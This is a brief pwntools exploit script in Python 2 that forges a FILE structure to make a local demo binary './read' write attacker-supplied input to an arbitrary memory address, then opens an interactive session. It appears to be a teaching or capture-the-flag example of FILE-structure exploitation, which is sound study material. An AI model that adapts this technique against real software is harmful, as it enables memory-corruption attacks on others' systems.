from pwn import *

r=process('./read')

context.arch='amd64'
structure=FileStructure(null=0x6011d0) # Get the file structure

'''
The read function will generate the payload for reading data into an arbitrary address.
It's arguments are -
        * The address where the data is to be read
        * The size of data to be read
'''

payload=structure.read(addr=0x6010c0,size=100) # Read into an arbitrary address
r.send(payload.ljust(0x78,'\x00'))
r.sendline("This_is_the_input_at_the_arbitrary_address!")
r.interactive()
print r.recvall()
